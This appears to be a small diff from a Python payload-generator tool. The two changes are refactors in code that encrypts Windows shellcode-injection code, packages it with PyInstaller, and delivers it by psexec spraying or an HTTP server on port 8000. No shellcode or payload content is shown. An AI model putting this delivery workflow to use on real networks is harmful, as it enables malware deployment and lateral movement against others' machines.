@@ -67,7 +67,7 @@ def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
 
     randoFileName = ''.join(random.sample(string.ascii_lowercase, 8))
     with open('%s/%s.py' % (payloaddir(), randoFileName), 'w+') as Filesave:
-        Filesave.write(do_Encryption(SHELLCODE.injectwindows % (ez2read_shellcode)))
+        Filesave.write(do_Encryption(injectwindows % (ez2read_shellcode)))
         Filesave.close()
     print '[*] Creating Payload using Pyinstaller...'
 
@@ -110,4 +110,4 @@ def DoPayloadUpload(payloadname):
     if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
         DoPsexecSpray(payloaddir() + '/' + payloadname + '.exe')
     elif want_to_upload.lower() == 'y' or want_to_upload.lower() == '':
-        FUNCTIONS().DoServe(returnIP(), payloadname, payloaddir(), port=8000, printIt = True)
+        DoServe(returnIP(), payloadname, payloaddir(), port=8000, printIt = True)
